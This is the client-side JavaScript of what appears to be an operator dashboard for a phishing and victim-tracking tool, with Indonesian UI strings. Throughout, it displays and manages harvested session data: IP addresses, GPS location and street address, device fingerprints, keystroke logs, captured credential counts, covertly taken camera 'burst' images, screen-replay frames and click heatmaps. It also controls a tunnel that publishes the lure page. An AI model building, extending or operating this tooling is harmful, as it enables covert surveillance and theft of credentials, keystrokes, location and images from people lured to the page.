window.SESSIONS.forEach(s => {
  if (s.lat && s.lon) {
    const el = document.getElementById('map-' + s.ts);
    if (!el) return;
    try {
      const map = L.map(el, { zoomControl: false, attributionControl: false }).setView([s.lat, s.lon], 13);
      L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', { maxZoom: 19 }).addTo(map);
      L.marker([s.lat, s.lon]).addTo(map);
    } catch (e) {}
  }
});

(function() {
  const days = [], counts = [];
  const now = new Date();
  for (let i = 6; i >= 0; i--) {
    const d = new Date(now); d.setDate(d.getDate() - i);
    days.push((d.getMonth() + 1) + '/' + d.getDate()); counts.push(0);
  }
  window.SESSIONS.forEach(s => {
    const dt = new Date(s.created_at);
    const diff = Math.floor((now - dt) / (1000 * 60 * 60 * 24));
    if (diff >= 0 && diff <= 6) counts[6 - diff]++;
  });
  const t = document.getElementById('chartTimeline');
  if (t && window.Chart) {
    new Chart(t, { type: 'line', data: { labels: days, datasets: [{ label: 'Sesi', data: counts, borderColor: '#4a9eff', backgroundColor: 'rgba(74,158,255,0.15)', fill: true, tension: 0.35 }] }, options: { plugins: { legend: { display: false } }, scales: { x: { ticks: { color: '#888' }, grid: { color: '#1a1a1a' } }, y: { ticks: { color: '#888' }, grid: { color: '#1a1a1a' }, beginAtZero: true } } } });
  }
  const cc = {};
  window.SESSIONS.forEach(s => { if (s.city) cc[s.city] = (cc[s.city] || 0) + 1; });
  const top = Object.entries(cc).sort((a, b) => b[1] - a[1]).slice(0, 5);
  const c = document.getElementById('chartCities');
  if (c && top.length && window.Chart) {
    new Chart(c, { type: 'doughnut', data: { labels: top.map(x => x[0]), datasets: [{ data: top.map(x => x[1]), backgroundColor: ['#4a9eff', '#a06bff', '#5be36e', '#ffb547', '#ff6b6b'] }] }, options: { plugins: { legend: { labels: { color: '#ccc', font: { size: 11 } } } } } });
  }
})();

document.querySelectorAll('.del').forEach(a => {
  a.addEventListener('click', async e => {
    e.preventDefault();
    const ts = a.dataset.ts;
    const r = await Swal.fire({ title: 'Hapus sesi ini?', html: '<code>' + ts + '</code>', icon: 'warning', showCancelButton: true, confirmButtonText: 'Hapus', confirmButtonColor: '#c33' });
    if (!r.isConfirmed) return;
    const res = await fetch('/api/delete/' + ts, { method: 'POST' });
    if ((await res.json()).ok) {
      a.closest('.card').remove();
      Swal.fire({ icon: 'success', title: 'Terhapus', timer: 1000, showConfirmButton: false });
    }
  });
});

document.getElementById('btnDeleteAll').addEventListener('click', async e => {
  e.preventDefault();
  const r = await Swal.fire({ title: 'Hapus SEMUA?', text: 'Tidak bisa dibatalkan!', icon: 'error', showCancelButton: true, confirmButtonText: 'Ya', confirmButtonColor: '#c33' });
  if (!r.isConfirmed) return;
  const res = await fetch('/api/delete-all', { method: 'POST' });
  const out = await res.json();
  Swal.fire({ icon: 'success', title: out.msg, timer: 1500, showConfirmButton: false });
  setTimeout(() => location.reload(), 1200);
});

document.querySelectorAll('.show-detail').forEach(a => {
  a.addEventListener('click', async e => {
    e.preventDefault();
    const ts = a.dataset.ts;
    const res = await fetch('/api/session/' + ts);
    const out = await res.json();
    if (!out.ok) return Swal.fire('Gagal', 'Not found', 'error');
    const d = out.data;
    let fpRows = '';
    if (d.fingerprint_obj && Object.keys(d.fingerprint_obj).length) {
      fpRows = Object.entries(d.fingerprint_obj).map(([k, v]) =>
        '<tr><td>' + esc(k) + '</td><td><code>' + esc(typeof v === 'object' ? JSON.stringify(v) : v) + '</code></td></tr>'
      ).join('');
    }
    const html = '<div class="detail-modal"><table>' +
      '<tr><td>Waktu</td><td>' + esc(d.waktu) + '</td></tr>' +
      '<tr><td>IP Publik</td><td><code>' + esc(d.ip_publik) + '</code></td></tr>' +
      '<tr><td>IP Lokal</td><td><code>' + esc(d.ip_lokal) + '</code></td></tr>' +
      '<tr><td>Kota</td><td>' + esc(d.city) + ', ' + esc(d.region) + '</td></tr>' +
      '<tr><td>ISP</td><td>' + esc(d.isp) + '</td></tr>' +
      '<tr><td>VPN</td><td>' + (d.is_vpn ? 'Ya' : 'Tidak') + '</td></tr>' +
      '<tr><td>GPS</td><td><code>' + (d.lat || '-') + ', ' + (d.lon || '-') + '</code></td></tr>' +
      '<tr><td>Alamat</td><td>' + esc(d.alamat) + '</td></tr>' +
      '<tr><td>Campaign</td><td>' + esc(d.campaign) + '</td></tr>' +
      '<tr><td>Events</td><td>' + (d.event_count || 0) + '</td></tr>' +
      '<tr><td>Burst</td><td>' + (d.burst_count || 0) + '</td></tr>' +
      '<tr><td>Keylog</td><td>' + (d.key_count || 0) + '</td></tr>' +
      '<tr><td>Creds</td><td>' + (d.cred_count || 0) + '</td></tr>' +
      '<tr><td>User Agent</td><td><code style="font-size:11px">' + esc((d.user_agent || '').substring(0, 200)) + '</code></td></tr>' +
      '</table><h4 style="margin-top:16px;color:#888;font-size:12px">FINGERPRINT</h4><table>' + fpRows + '</table></div>';
    Swal.fire({ title: 'Detail', html, width: 700 });
  });
});

document.querySelectorAll('.show-events').forEach(a => {
  a.addEventListener('click', async e => {
    e.preventDefault();
    const ts = a.dataset.ts;
    const res = await fetch('/api/session/' + ts + '/events');
    const ev = await res.json();
    const html = ev.length ? ev.map(x => '<div style="margin:4px 0;font-size:11px"><b>' + esc(x.event_type) + '</b> <span style="color:#666">' + (x.created_at || '') + '</span><br><code>' + esc(x.data) + '</code></div>').join('<hr style="border-color:#222">') : '<p>Belum ada event.</p>';
    Swal.fire({ title: 'Event Log', html: '<div style="text-align:left;max-height:400px;overflow:auto">' + html + '</div>', width: 650 });
  });
});

document.querySelectorAll('.show-keys').forEach(a => {
  a.addEventListener('click', async e => {
    e.preventDefault();
    const ts = a.dataset.ts;
    const res = await fetch('/api/session/' + ts + '/keys');
    const ev = await res.json();
    const html = ev.length ? ev.map(x => '<code style="margin-right:4px">' + esc(x.key) + '</code>').join('') : '<p>Belum ada keylog.</p>';
    Swal.fire({ title: 'Keylog', html: '<div style="text-align:left;max-height:400px;overflow:auto;font-family:monospace">' + html + '</div>', width: 650 });
  });
});

document.querySelectorAll('.show-burst').forEach(a => {
  a.addEventListener('click', async e => {
    e.preventDefault();
    const ts = a.dataset.ts;
    const res = await fetch('/api/session/' + ts + '/burst');
    const arr = await res.json();
    if (!arr.length) return Swal.fire('Burst', 'Belum ada', 'info');
    const html = '<div class="burst-grid">' + arr.map(x => '<a href="/api/file/' + x.filename + '" target="_blank"><img src="/api/file/' + x.filename + '" loading="lazy"></a>').join('') + '</div>';
    Swal.fire({ title: 'Burst (' + arr.length + ')', html, width: 700 });
  });
});

const searchBox = document.getElementById('searchBox');
const filterCampaign = document.getElementById('filterCampaign');
const filterPhoto = document.getElementById('filterPhoto');
const camps = new Set();
window.SESSIONS.forEach(s => { if (s.campaign) camps.add(s.campaign); });
camps.forEach(c => {
  const o = document.createElement('option'); o.value = c; o.textContent = c;
  filterCampaign.appendChild(o);
});
function applyFilter() {
  const q = (searchBox.value || '').toLowerCase().trim();
  const camp = filterCampaign.value;
  const photo = filterPhoto.value;
  document.querySelectorAll('.card').forEach(card => {
    const hay = (card.dataset.search || '').toLowerCase();
    const show = (!q || hay.includes(q)) && (!camp || card.dataset.campaign === camp) && (!photo || card.dataset.hasPhoto === photo);
    card.style.display = show ? '' : 'none';
  });
}
searchBox.addEventListener('input', applyFilter);
filterCampaign.addEventListener('change', applyFilter);
filterPhoto.addEventListener('change', applyFilter);
document.getElementById('btnRefresh').addEventListener('click', () => location.reload());

function esc(s) {
  if (s == null) return '';
  return String(s).replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;').replace(/"/g, '&quot;');
}


// ============================================================
// TUNNEL CONTROL
// ============================================================
(function() {
  const panel = document.getElementById('tunnelPanel');
  const btnMain = document.getElementById('btnTunnel');
  if (!panel || !btnMain) return;

  const dot = document.getElementById('tunnelDot');
  const statusText = document.getElementById('tunnelStatusText');
  const pidText = document.getElementById('tunnelPid');
  const urlEl = document.getElementById('tunnelUrl');
  const logEl = document.getElementById('tunnelLog');

  btnMain.addEventListener('click', () => {
    panel.classList.toggle('active');
    if (panel.classList.contains('active')) {
      refreshTunnel();
      loadTunnelLog();
    }
  });

  async function refreshTunnel() {
    try {
      const res = await fetch('/api/tunnel/status');
      const data = await res.json();
      if (data.running) {
        dot.className = 'tunnel-status-dot on';
        statusText.textContent = 'Running';
        statusText.style.color = '#2ea043';
        pidText.textContent = 'PID: ' + data.pid;
        if (data.url) {
          urlEl.innerHTML = '🔗 <a href="' + data.url + '" target="_blank">' + data.url + '</a>';
        } else {
          urlEl.textContent = 'URL belum tersedia, tunggu 5-10 detik...';
        }
      } else {
        dot.className = 'tunnel-status-dot off';
        statusText.textContent = 'Stopped';
        statusText.style.color = '#da3633';
        pidText.textContent = '';
        urlEl.textContent = '-';
      }
    } catch (e) {
      statusText.textContent = 'Error: ' + e.message;
      statusText.style.color = '#da3633';
    }
  }

  async function loadTunnelLog() {
    try {
      const res = await fetch('/api/tunnel/log');
      const data = await res.json();
      logEl.textContent = data.log || 'Belum ada log';
      logEl.scrollTop = logEl.scrollHeight;
    } catch (e) {
      logEl.textContent = 'Error: ' + e.message;
    }
  }

  document.getElementById('btnTunnelStart').addEventListener('click', async () => {
    Swal.fire({ title: 'Menjalankan tunnel...', didOpen: () => Swal.showLoading(), allowOutsideClick: false });
    try {
      const res = await fetch('/api/tunnel/start', { method: 'POST' });
      const data = await res.json();
      Swal.close();
      Swal.fire({ icon: 'success', title: 'Tunnel dimulai', text: data.msg, timer: 2500, showConfirmButton: false });
      setTimeout(() => { refreshTunnel(); loadTunnelLog(); }, 3000);
      setTimeout(() => { refreshTunnel(); }, 8000);
    } catch (e) {
      Swal.fire('Error', e.message, 'error');
    }
  });

  document.getElementById('btnTunnelStop').addEventListener('click', async () => {
    const r = await Swal.fire({
      title: 'Stop tunnel?', icon: 'warning',
      showCancelButton: true, confirmButtonText: 'Stop', confirmButtonColor: '#da3633',
    });
    if (!r.isConfirmed) return;
    try {
      const res = await fetch('/api/tunnel/stop', { method: 'POST' });
      const data = await res.json();
      Swal.fire({ icon: 'success', title: data.msg, timer: 1500, showConfirmButton: false });
      refreshTunnel();
    } catch (e) {
      Swal.fire('Error', e.message, 'error');
    }
  });

  document.getElementById('btnTunnelRefresh').addEventListener('click', () => {
    refreshTunnel();
    loadTunnelLog();
  });

  document.getElementById('btnTunnelCopy').addEventListener('click', () => {
    const url = urlEl.textContent.trim();
    if (!url || url === '-' || url.indexOf('http') === -1) {
      Swal.fire('Copy', 'URL belum tersedia', 'info');
      return;
    }
    const match = url.match(/https:\/\/[^\s]+/);
    const cleanUrl = match ? match[0] : url;
    navigator.clipboard.writeText(cleanUrl).then(() => {
      Swal.fire({ icon: 'success', title: 'URL dicopy', text: cleanUrl, timer: 1500, showConfirmButton: false });
    }).catch(() => {
      Swal.fire('Copy manual', cleanUrl, 'info');
    });
  });

  // Auto-refresh tiap 8 detik kalau panel terbuka
  setInterval(() => {
    if (panel.classList.contains('active')) {
      refreshTunnel();
    }
  }, 8000);
})();


// ============================================================
// REPORTS SUITE — Replay + Heatmap
// ============================================================

// === SESSION REPLAY ===
document.querySelectorAll('.show-replay').forEach(a => {
  a.addEventListener('click', async e => {
    e.preventDefault();
    const ts = a.dataset.ts;

    Swal.fire({ title: 'Loading replay...', didOpen: () => Swal.showLoading(), allowOutsideClick: false });

    try {
      const res = await fetch('/api/session/' + ts + '/replay');
      const data = await res.json();
      Swal.close();

      if (!data.ok || !data.frames || !data.frames.length) {
        Swal.fire('Replay', 'Belum ada frame untuk sesi ini', 'info');
        return;
      }

      const frames = data.frames;
      const timeline = data.timeline || [];

      let timelineHtml = '';
      if (timeline.length) {
        timelineHtml = '<div class="replay-timeline">' +
          timeline.slice(-50).map(t =>
            '<div class="replay-event"><b>' + escHtml(t.type) + '</b> <span class="time">' + escHtml(t.time || '') + '</span><br>' +
            '<span style="color:#6e7681;font-size:10px">' + escHtml((t.data || '').substring(0, 120)) + '</span></div>'
          ).join('') + '</div>';
      }

      Swal.fire({
        title: '🎥 Session Replay — ' + ts,
        html:
          '<div class="replay-modal">' +
          '<img id="replayImg" class="replay-img" src="/api/file/' + frames[0].filename + '">' +
          '<div class="replay-label" id="replayLabel">' + escHtml(frames[0].label) + ' (' + frames.length + ' frames)</div>' +
          '<input type="range" id="replaySlider" class="replay-slider" min="0" max="' + (frames.length - 1) + '" value="0">' +
          '<div class="replay-controls">' +
            '<button class="replay-btn" id="replayPrev">⏮ Prev</button>' +
            '<button class="replay-btn" id="replayPlay">▶ Play</button>' +
            '<button class="replay-btn" id="replayNext">⏭ Next</button>' +
          '</div>' +
          timelineHtml +
          '</div>',
        width: 800,
        showConfirmButton: false,
        showCloseButton: true,
        didOpen: () => {
          const img = document.getElementById('replayImg');
          const slider = document.getElementById('replaySlider');
          const label = document.getElementById('replayLabel');
          let playing = false;
          let timer = null;

          function showFrame(i) {
            i = Math.max(0, Math.min(frames.length - 1, i));
            slider.value = i;
            img.src = '/api/file/' + frames[i].filename;
            label.textContent = frames[i].label + ' (' + (i + 1) + '/' + frames.length + ')';
          }

          slider.addEventListener('input', () => showFrame(parseInt(slider.value)));
          document.getElementById('replayPrev').addEventListener('click', () => showFrame(parseInt(slider.value) - 1));
          document.getElementById('replayNext').addEventListener('click', () => showFrame(parseInt(slider.value) + 1));
          document.getElementById('replayPlay').addEventListener('click', function() {
            if (playing) {
              clearInterval(timer);
              playing = false;
              this.textContent = '▶ Play';
            } else {
              playing = true;
              this.textContent = '⏸ Pause';
              timer = setInterval(() => {
                let v = parseInt(slider.value) + 1;
                if (v >= frames.length) v = 0;
                showFrame(v);
              }, 800);
            }
          });
        }
      });
    } catch (err) {
      Swal.close();
      Swal.fire('Error', err.message, 'error');
    }
  });
});

// === CLICK HEATMAP ===
document.querySelectorAll('.show-heatmap').forEach(a => {
  a.addEventListener('click', async e => {
    e.preventDefault();
    const ts = a.dataset.ts;

    Swal.fire({ title: 'Loading heatmap...', didOpen: () => Swal.showLoading(), allowOutsideClick: false });

    try {
      const res = await fetch('/api/heatmap/' + ts);
      const data = await res.json();
      Swal.close();

      if (!data.ok || !data.clicks || !data.clicks.length) {
        Swal.fire('Heatmap', 'Belum ada klik untuk sesi ini', 'info');
        return;
      }

      // Bikin visual heatmap
      let bgHtml = '';
      if (data.screenshot_url) {
        bgHtml = '<img class="heatmap-bg" src="' + data.screenshot_url + '">';
      } else {
        bgHtml = '<div class="heatmap-no-bg">Screenshot tidak tersedia</div>';
      }

      const dots = data.clicks.map(c =>
        '<div class="heatmap-dot" style="left:' + c.x + '%;top:' + c.y + '%"></div>'
      ).join('');

      Swal.fire({
        title: '🔥 Click Heatmap — ' + ts,
        html:
          '<div class="heatmap-container">' +
          bgHtml +
          '<div class="heatmap-overlay">' + dots + '</div>' +
          '</div>' +
          '<div class="heatmap-stats">Total klik: <b>' + data.total + '</b> · Area merah = sering diklik</div>',
        width: 750,
        showConfirmButton: true,
        confirmButtonText: 'Tutup'
      });
    } catch (err) {
      Swal.close();
      Swal.fire('Error', err.message, 'error');
    }
  });
});

function escHtml(s) {
  if (s == null) return '';
  return String(s).replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;').replace(/"/g, '&quot;');
}
